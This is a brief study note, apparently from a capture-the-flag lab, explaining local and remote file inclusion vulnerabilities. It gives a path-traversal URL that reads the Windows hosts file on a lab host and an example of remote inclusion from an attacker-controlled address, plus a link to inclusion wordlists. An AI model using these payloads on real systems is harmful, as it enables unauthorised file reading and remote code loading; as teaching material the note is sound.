### LFI --> Local file inclusion

---

LFI or Local File Inclusion occurs when an attacker is able to get a website to include a file that was not
intended to be an option for this application. A common example is when an application uses the path to a
file as input. If the application treats this input as trusted, and the required sanitary checks are not
performed on this input, then the attacker can exploit it by using the ../ string in the inputted file name
and eventually view sensitive files in the local file system. In some limited cases, an LFI can lead to code
execution as well.

```linux
WINDOWS\System32\drivers\etc\hosts
http://unika.htb/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts // If doesn't return in error, LFI is possible
```

RFI or Remote File Inclusion is similar to LFI but in this case it is possible for an attacker to load a remote
file on the host using protocols like HTTP, FTP etc.

```linux
//10.10.14.6/somefile --> RFI
```

---

[LFI wordlists](https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt)

